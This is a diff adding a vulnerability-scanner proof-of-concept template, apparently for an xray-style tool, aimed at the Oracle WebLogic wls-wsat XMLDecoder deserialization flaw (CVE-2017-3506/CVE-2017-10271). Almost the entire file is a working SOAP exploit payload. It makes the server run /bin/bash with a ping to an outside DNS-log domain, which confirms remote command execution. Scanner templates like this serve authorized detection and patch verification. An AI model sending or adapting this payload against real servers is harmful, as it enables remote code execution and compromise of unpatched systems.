@@ -1,0 +1,64 @@
+id: poc-yaml-oracle-weblogic-server-wls-wsat-rce
+info:
+  name: Weblogic 反序列化漏洞（CVE-2017-3506/CVE-2017-10271）
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - 反序列化
+  - CVE-2017-3506
+  - CVE-2017-10271
+  finger: communications_diameter_signaling_router
+  fofa: null
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /wls-wsat/CoordinatorPortType
+  headers:
+    Content-Type: text/xml
+  data: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+    <soapenv:Header>
+
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+
+    <java version="1.4.0" class="java.beans.XMLDecoder">
+
+    <void class="java.lang.ProcessBuilder">
+
+    <array class="java.lang.String" length="3">
+
+    <void index="0">
+
+    <string>/bin/bash</string>
+
+    </void>
+
+    <void index="1">
+
+    <string>-c</string>
+
+    </void>
+
+    <void index="2">
+
+    <string>ping -nc 2 {{.reverseDomain}}</string>
+
+    </void>
+
+    </array>
+
+    <void method="start"/></void>
+
+    </java>
+
+    </work:WorkContext>
+
+    </soapenv:Header>
+
+    <soapenv:Body/>
+
+    </soapenv:Envelope>'
+  expression: reverse.Verify()
+transport: http
